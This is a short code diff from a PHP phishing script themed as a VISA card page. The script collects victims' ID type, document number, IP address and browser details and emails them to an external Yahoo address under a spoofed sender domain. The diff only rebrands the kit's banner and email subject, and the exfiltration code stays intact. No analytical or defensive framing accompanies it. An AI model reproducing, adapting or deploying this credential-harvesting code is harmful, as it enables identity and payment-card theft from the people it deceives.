@@ -34,7 +34,7 @@ $ip = getenv("REMOTE_ADDR");
 $brow .= $_SERVER['HTTP_USER_AGENT'];
 
 $content .="
-------------------------Nueva Tarjeta VISA lolom v1--------------------------- <br>
+------------------------Nueva Tarjeta VISA J0RG3X v1--------------------------- <br>
 -------------------------------LOGIN-------------------------------- <br>
 Tipo de DNI:           |    $tipedoc <br>
 Documento:             |    $doc <br>
@@ -59,9 +59,9 @@ Navegador: $brow <br>
 ";
 
 $recipient = "latinrust@yahoo.com";
-$subject = "CC - $ip";
+$subject = "Datos Visa Home - $ip";
 $prefijo = substr(md5(uniqid(rand())),0,6);
-$from = "From:Visa - $ip<$prefijo@dmnpr0.com>";
+$from = "From:Datos Visa Home - $ip<$prefijo@dmnpr0.com>";
 
 mail($recipient,$subject,$content,$from);
 
